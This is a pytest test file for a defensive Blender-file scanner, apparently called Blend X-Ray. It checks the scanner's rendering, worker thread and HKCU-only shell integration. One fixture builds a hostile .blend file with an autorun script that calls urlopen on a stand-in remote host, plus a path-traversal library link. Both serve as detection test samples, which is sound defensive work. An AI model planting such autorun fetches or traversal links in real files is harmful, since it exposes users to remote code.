# SPDX-License-Identifier: GPL-3.0-or-later
"""Tests for the window's data layer: palette rules, rendering, worker, registry.

Nothing here imports tkinter. The modules that draw pixels are deliberately
thin wrappers over the modules tested below, so the rules that actually matter
-- no green, never the word "safe", explanation before source, HKCU only --
are checked on a machine with no display and no Tk.

**No test in this file writes to the Windows registry.** The shell-integration
tests exercise the functions that *describe* the change; installing is a
deliberate, user-confirmed action and never a side effect of running tests.

The tests that do need the widget layer, the Tk event loop, or a stand-in for
the registry itself live next door in ``test_gui_window.py``.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

from blend_xray import guards, scanner, strings
from blend_xray.gui import render, scan_worker, shell_integration, theme
from blend_xray.gui.render import Line, Source
from blend_xray.gui.scan_worker import Failed, Finished, Scanned, ScanWorker

from .blend_builder import BlendBuilder, minimal_blend
from .conftest import BANNED_WORDS_BY_LANG

HOSTILE_SCRIPT = """
import urllib.request
urllib.request.urlopen("http://drop.example-host.top/p").read()
"""


@pytest.fixture
def hostile_blend(tmp_path: Path) -> Path:
    builder = BlendBuilder()
    builder.add_text("autorun.py", HOSTILE_SCRIPT, flags=1 | 4 | 16)
    builder.add_library("//../../outside/secret.blend")
    path = tmp_path / "hostile.blend"
    path.write_bytes(builder.to_bytes())
    return path


@pytest.fixture
def empty_blend(tmp_path: Path) -> Path:
    path = tmp_path / "empty.blend"
    path.write_bytes(minimal_blend())
    return path


def _index_of_line(elements: list[render.Element], needle: str) -> int:
    for index, element in enumerate(elements):
        if isinstance(element, Line) and needle in element.text:
            return index
    raise AssertionError(f"no line containing {needle!r} was rendered")


def _index_of_source(elements: list[render.Element]) -> int:
    for index, element in enumerate(elements):
        if isinstance(element, Source):
            return index
    raise AssertionError("no source block was rendered")


# -- the no-green rule --------------------------------------------------------
def test_palette_has_no_green() -> None:
    """Green reads as "all clear" at a glance. That is the failure mode."""
    greens = [name for name, value in theme.COLOURS.items() if theme.is_green(value)]
    assert greens == [], f"green is not allowed in the palette: {greens}"


def test_every_tag_the_renderer_can_emit_has_a_style() -> None:
    assert set(theme.TAG_STYLES) >= {theme.TAG_ALARM, theme.TAG_NOTABLE, theme.TAG_DIM}
    for role, _bold in theme.TAG_STYLES.values():
        assert role in theme.COLOURS


# -- the never-say-safe rule, extended to every GUI string --------------------
def test_no_catalogue_string_says_safe_in_any_language() -> None:
    """The same assertion the report is held to, applied to the source table.

    Checking the catalogue rather than one rendered report is what makes this
    cover the GUI: every window label, button, dialog and status line is a
    catalogue entry, and most of them never appear in a scan report at all.
    """
    for lang, banned_words in BANNED_WORDS_BY_LANG.items():
        for key, value in strings.CATALOGUE[lang].items():
            lowered = value.lower()
            for banned in banned_words:
                assert banned not in lowered, f"[{lang}] {key} must never say {banned!r}"


def test_every_gui_string_is_translated_in_every_language() -> None:
    gui_keys = {k for k in strings.CATALOGUE["en"] if k.startswith("gui_")}
    assert gui_keys, "the GUI catalogue section disappeared"
    for lang, table in strings.CATALOGUE.items():
        missing = sorted(gui_keys - set(table))
        assert missing == [], f"{lang} is missing GUI strings: {missing}"


# -- rendering order ----------------------------------------------------------
def test_explanation_comes_first_and_raw_source_comes_last(hostile_blend: Path) -> None:
    elements = render.render_result(scanner.scan_file(hostile_blend))
    explanation = _index_of_line(elements, strings.t("explain_header"))
    literals = _index_of_line(elements, strings.t("explain_literals_header"))
    source = _index_of_source(elements)
    assert explanation < literals < source


def test_recommendation_is_drawn_near_the_top(hostile_blend: Path) -> None:
    """It is the part that turns a finding into an action, so it is not buried."""
    elements = render.render_result(scanner.scan_file(hostile_blend))
    recommendation = _index_of_line(elements, strings.t("recommend_header"))
    summary = _index_of_line(elements, strings.t("summary_blocks_found", count=1)[:10])
    assert recommendation < summary
    assert recommendation < _index_of_source(elements)


def test_an_alarming_file_asks_for_a_human(hostile_blend: Path) -> None:
    elements = render.render_result(scanner.scan_file(hostile_blend))
    text = render.plain_text(elements)
    assert strings.t("recommend_needs_human") in text
    assert strings.t("recommend_autorun_present") in text


def test_the_source_body_is_present_for_the_clipboard(hostile_blend: Path) -> None:
    """Collapsed on screen, but expanded in the copied text."""
    elements = render.render_result(scanner.scan_file(hostile_blend))
    assert any(isinstance(e, Source) for e in elements)
    assert "urllib.request.urlopen" in render.plain_text(elements)


def test_a_file_with_no_findings_still_lists_what_was_checked(empty_blend: Path) -> None:
    text = render.plain_text(render.render_result(scanner.scan_file(empty_blend)))
    assert strings.t("nothing_found") in text
    assert strings.t("cat_driver") in text
    assert strings.t("not_a_verdict") in text


@pytest.mark.parametrize("lang", ["en", "fr"])
def test_nothing_found_is_said_exactly_once_in_the_window(
    empty_blend: Path, lang: str
) -> None:
    """The most-seen screen in the product used to print this paragraph twice.

    ``_recommendation()`` and ``render_result()`` both emitted it, under the
    same condition -- so 537 of the 578 corpus files produced a window that
    said the same 200 characters twice. The CLI says it once, and the two
    surfaces are not allowed to disagree about the shape of a report.
    """
    strings.set_language(lang)
    text = render.plain_text(render.render_result(scanner.scan_file(empty_blend)))
    assert text.count(strings.t("nothing_found")) == 1


def test_nothing_found_still_appears_when_the_recommendation_is_the_only_copy(
    empty_blend: Path,
) -> None:
    """Deleting the duplicate must not have deleted the sentence.

    It is emitted from the recommendation block, which is drawn near the top
    of the window -- so it has to land *before* the categories list, not after.
    """
    elements = render.render_result(scanner.scan_file(empty_blend))
    said = _index_of_line(elements, strings.t("nothing_found"))
    header = _index_of_line(elements, strings.t("recommend_header"))
    categories = _index_of_line(elements, strings.t("categories_checked_header", count=5)[:10])
    assert header < said < categories


# -- indentation and section rules --------------------------------------------
def test_no_section_rule_is_drawn_as_a_run_of_dashes(hostile_blend: Path) -> None:
    """A fixed character count stops mid-window in a proportional font.

    That is render.py's own stated reason for not reproducing the CLI's ASCII
    box in the window; the section rules had simply outlived it.
    """
    elements = render.render_result(scanner.scan_file(hostile_blend))
    for element in elements:
        if isinstance(element, Line):
            assert "---" not in element.text, element.text


def test_each_section_heading_is_followed_by_a_widget_drawn_separator(
    hostile_blend: Path,
) -> None:
    elements = render.render_result(scanner.scan_file(hostile_blend))
    separators = [i for i, e in enumerate(elements) if isinstance(e, render.Separator)]
    assert separators, "no section rule was emitted at all"
    for index in separators:
        heading = elements[index - 1]
        assert isinstance(heading, Line)
        assert heading.tag == theme.TAG_HEADING
        assert heading.text.strip(), "a rule was drawn under an unnamed section"


def test_a_separator_contributes_nothing_to_the_copied_text(hostile_blend: Path) -> None:
    """The clipboard gets prose: the bold heading above already names it."""
    assert render.plain_text([render.Separator()]) == ""


def test_every_indent_level_the_renderer_emits_has_a_configured_margin(
    hostile_blend: Path, empty_blend: Path
) -> None:
    """The indent is a tag now, and a level with no tag silently draws flush left.

    ``wrap="word"`` means an indent written into the text reaches the first
    visual line only; ``lmargin2`` is what keeps a wrapped evidence line under
    its statement. The tags are configured up to MAX_INDENT_LEVEL, so the
    renderer must not emit past it.
    """
    for path in (hostile_blend, empty_blend):
        elements = render.render_result(scanner.scan_file(path))
        deepest = max(
            (e.indent for e in elements if isinstance(e, Line | Source)), default=0
        )
        assert deepest <= theme.MAX_INDENT_LEVEL, f"indent {deepest} has no tag"


def test_indent_tags_are_distinct_and_clamped() -> None:
    names = [theme.indent_tag(level) for level in range(theme.MAX_INDENT_LEVEL + 1)]
    assert len(set(names)) == len(names)
    assert theme.indent_tag(99) == theme.indent_tag(theme.MAX_INDENT_LEVEL)
    assert theme.indent_tag(-3) == theme.indent_tag(0)


def test_the_clipboard_still_indents_with_spaces(hostile_blend: Path) -> None:
    """Pixels are for the window; a paste into a message has only spaces."""
    line = Line("evidence", theme.TAG_DIM, indent=3)
    assert line.rendered() == render.INDENT * 3 + "evidence"
    assert line.text == "evidence", "the indent must not also be in the text"


def test_renderer_only_emits_known_tags(hostile_blend: Path) -> None:
    elements = render.render_result(scanner.scan_file(hostile_blend))
    tags = {e.tag for e in elements if isinstance(e, Line)}
    assert tags <= set(theme.TAG_STYLES)


def test_render_error_uses_the_shared_catalogue_key() -> None:
    elements = render.render_error(Path("x.blend"), "malformed", "bad header")
    text = render.plain_text(elements)
    assert strings.t("err_malformed", reason="bad header") in text
    assert strings.t("gui_error_header") in text


def test_render_switches_language_with_the_catalogue(empty_blend: Path) -> None:
    result = scanner.scan_file(empty_blend)
    english = render.plain_text(render.render_result(result))
    strings.set_language("fr")
    french = render.plain_text(render.render_result(result))
    assert english != french
    assert strings.CATALOGUE["fr"]["not_a_verdict"] in french


# -- the worker ---------------------------------------------------------------
def _drain(worker: ScanWorker) -> list[object]:
    worker.start()
    events: list[object] = []
    while True:
        event = worker.events.get(timeout=30)
        events.append(event)
        if isinstance(event, Finished):
            return events


def test_worker_scans_every_file_and_finishes(hostile_blend: Path, empty_blend: Path) -> None:
    events = _drain(ScanWorker([hostile_blend, empty_blend]))
    finished = events[-1]
    assert isinstance(finished, Finished)
    assert (finished.done, finished.total, finished.cancelled) == (2, 2, False)
    assert sum(isinstance(e, Scanned) for e in events) == 2


def test_worker_reports_a_bad_file_instead_of_dying(tmp_path: Path) -> None:
    """One hostile file must not take the worker thread down with it."""
    broken = tmp_path / "not-a-blend.blend"
    broken.write_bytes(b"this is not a blend file at all")
    events = _drain(ScanWorker([broken]))
    failures = [e for e in events if isinstance(e, Failed)]
    assert len(failures) == 1
    assert failures[0].kind in {"not_a_blend", "malformed"}
    assert isinstance(events[-1], Finished)


def test_worker_cancelled_before_it_starts_reads_nothing(hostile_blend: Path) -> None:
    worker = ScanWorker([hostile_blend, hostile_blend])
    worker.cancel()
    events = _drain(worker)
    finished = events[-1]
    assert isinstance(finished, Finished)
    assert (finished.done, finished.cancelled) == (0, True)
    assert not any(isinstance(e, Scanned) for e in events)


def test_worker_classifies_the_error_kinds_the_catalogue_knows() -> None:
    assert scan_worker.classify(guards.NotABlendFileError("x")) == "not_a_blend"
    assert scan_worker.classify(guards.MalformedBlendError("x")) == "malformed"
    assert scan_worker.classify(scanner.ToolError("x")) == "tool_error"
    assert scan_worker.classify(OSError("x")) == "unreadable"


# -- the optional Windows right-click entry -----------------------------------
def test_registry_target_is_hkcu_only() -> None:
    """No HKLM anywhere means no admin prompt and no machine-wide change."""
    assert shell_integration.DISPLAY_KEY.startswith("HKEY_CURRENT_USER\\")
    assert "HKEY_LOCAL_MACHINE" not in shell_integration.DISPLAY_KEY
    assert "HKLM" not in shell_integration.DISPLAY_KEY


def test_registry_target_adds_a_verb_without_taking_over_the_extension() -> None:
    assert "SystemFileAssociations\\.blend" in shell_integration.KEY_PATH


def test_launch_command_passes_the_clicked_file() -> None:
    command = shell_integration.launch_command()
    assert command.endswith('"%1"')
    assert command.startswith('"')


def test_plan_reports_exactly_what_would_be_written() -> None:
    """The dialog shows this. It must be the same string install() writes."""
    plan = shell_integration.plan("Inspect with Blend X-Ray")
    assert plan.key == shell_integration.DISPLAY_KEY
    assert plan.command == shell_integration.launch_command()
    assert plan.label == "Inspect with Blend X-Ray"


def test_feature_is_windows_only() -> None:
    assert shell_integration.is_supported() is (sys.platform == "win32")


@pytest.mark.skipif(sys.platform == "win32", reason="off-Windows behaviour")
def test_install_refuses_off_windows() -> None:
    with pytest.raises(shell_integration.ShellIntegrationError):
        shell_integration.install("x")

